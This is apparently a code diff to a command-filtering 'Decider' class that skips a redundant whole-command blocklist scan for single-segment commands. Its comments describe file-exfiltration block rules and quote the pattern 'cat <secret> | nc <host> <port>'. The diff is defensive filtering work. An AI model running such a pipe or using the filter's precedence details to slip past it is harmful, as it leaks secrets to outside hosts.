@@ -166,6 +166,15 @@ class Decider:
             self._sandbox,
             self._layer4,
         ) = self._build_layers(user_rules)
+        # PERF-004: true when the effective blocklist holds ONLY block-action
+        # rules. In that state evaluate()'s whole-command pass and the
+        # per-segment pass's Layer-1 walk are the same first-match scan in the
+        # same priority order (see evaluate()); any non-block same-ID override
+        # in the list keeps the whole-command pass alive for its BLOCK-only
+        # precedence.
+        self._blocklist_all_block = all(
+            rule.action == Action.BLOCK for rule in self._blocklist
+        )
 
     @staticmethod
     def _build_rule_layers(
@@ -280,26 +289,51 @@ class Decider:
         # action is block take part — an allow/modify replacement must not
         # block the full command before segment evaluation.
         #
-        # DF-TERMINAL-JAIL-16: this whole-command pass is also what keeps the
-        # always-allow layer from APPROVING a pipeline whose sink is a raw
+        # PERF-004: this pass is SKIPPED when it would be pure duplicate work.
+        # The per-segment pass below already walks the SAME blocklist, in the
+        # same priority order, in its Layer 1. When the command parses to
+        # exactly ONE simple segment whose raw text is byte-identical to
+        # ``original`` AND the effective blocklist holds only block-action
+        # rules, the matcher sees identical input both times (every handler
+        # reads only ``segment.raw`` and ``segment.type`` — never ``tokens`` —
+        # and parse_command emits SIMPLE segments), so the segment pass reaches
+        # the byte-identical verdict on its own and this extra full-payload
+        # scan is duplicated work proportional to the command size (measured
+        # 1.19–1.20x one-shot wall clock on a 20 KB payload). The all-block
+        # condition preserves this pass's documented precedence: with a
+        # non-block same-ID override in the list, Layer 1 is first-match-wins
+        # over ALL actions, so a higher-priority allow override could shadow a
+        # lower-priority BLOCK rule here — the whole-command pass must keep
+        # running in that state. Pipelines, multi-segment commands and
+        # whitespace-stripped originals (segment raw != original) keep the
+        # pass as well.
+        #
+        # DF-TERMINAL-JAIL-16 (unchanged): when the pass runs, it is what keeps
+        # the always-allow layer from APPROVING a pipeline whose sink is a raw
         # network client. The file-exfiltration rules
         # (builtin-net-file-exfil-pipe / -redirect) are BLOCK rules, so they are
         # matched HERE — before the Layer-2 allowlist can short-circuit on the
         # pipeline's reader segment and return `rule_id=allow-cat-safe` for
         # `cat <secret> | nc <host> <port>`. Segment-level allow rules are
         # unaffected for every shape these rules do not match.
-        full_segment = Segment(
-            type=SegmentType.SIMPLE,
-            tokens=[],
-            raw=original,
-            pos=0,
-        )
-        for rule in self._blocklist:
-            if rule.action != Action.BLOCK:
-                continue
-            match_result = self.matcher.match_segment(full_segment, rule.match)
-            if match_result:
-                return self._result_for(rule, action=Action.BLOCK, command=original)
+        if not (
+            self._blocklist_all_block
+            and len(segments) == 1
+            and segments[0].type == SegmentType.SIMPLE
+            and segments[0].raw == original
+        ):
+            full_segment = Segment(
+                type=SegmentType.SIMPLE,
+                tokens=[],
+                raw=original,
+                pos=0,
+            )
+            for rule in self._blocklist:
+                if rule.action != Action.BLOCK:
+                    continue
+                match_result = self.matcher.match_segment(full_segment, rule.match)
+                if match_result:
+                    return self._result_for(rule, action=Action.BLOCK, command=original)
 
         # Then check each segment individually
         replacements: dict[int, str] = {}
